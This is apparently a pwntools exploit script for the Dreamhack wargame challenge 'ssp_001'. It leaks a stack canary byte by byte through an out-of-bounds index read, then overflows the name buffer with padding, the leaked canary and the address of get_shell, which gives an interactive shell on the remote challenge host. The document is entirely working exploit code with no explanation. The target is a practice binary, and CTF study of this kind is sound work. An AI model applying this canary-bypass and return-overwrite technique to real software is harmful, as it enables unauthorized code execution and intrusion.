from pwn import *

p = remote('host3.dreamhack.games', 21239)

elf = ELF('./ssp_001')

get_shell = elf.symbols['get_shell']

# P: print box
canary = b''

for i in range(131, 127, -1):
    p.sendlineafter(b'>', b'P')
    p.sendlineafter(b'Element index : ', str(i))
    p.recvuntil(b'is : ')
    canary += p.recv(2)

canary = int(canary, 16)
print("--canary--")
print(canary)

# E: scanf(name_len), read(name)
p.sendlineafter(b'>', b'E')

payload = b'A' * 0x40
payload += p32(canary) 
payload += b'B' * 0x8
payload += p32(get_shell)

p.sendlineafter(b'Name Size : ', str(len(payload) + 1))
p.sendlineafter(b"Name : ", payload)

p.interactive()